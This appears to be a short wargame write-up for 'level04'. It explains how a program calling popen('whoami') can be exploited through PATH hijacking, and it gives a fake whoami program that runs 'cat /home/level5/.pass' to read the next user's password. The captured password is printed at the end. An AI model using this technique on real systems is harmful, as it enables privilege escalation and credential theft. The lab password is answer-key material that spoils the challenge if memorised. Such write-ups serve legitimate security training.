we have source code:

	#include <stdlib.h>
	#include <stdio.h>

	int main() {
		char username[1024];
		FILE* f = popen("whoami","r");
		fgets(username, sizeof(username), f);
		printf("Welcome %s", username);

		return 0;
	}

-->> we have to open /home/level5/.pass instead of file whoami to get username.
-->> to change variable PATH (environment variable )

PATH is an environmental variable in Linux and other Unix-like operating systems that 
tells the shell which directories to search for executable files in response to commands 
issued by a user. Each user on a system can have a different PATH variable.

-->> to see PATH: echo PATH (use `env` to see total environment variable)

-->> create file /tmp/hehe/whoami.c (/tmp/hehe: optional)

-->> file whoami.c with content:

	#include <stdlib.h>

	int main(){
	  system("cat /home/level5/.pass");
	  return 0;
	}

-->> in command line: gcc whoami.c -o whoami
-->> run ./level04 to get password 

-->> pass: DNLM3Vu0mZfX0pDd
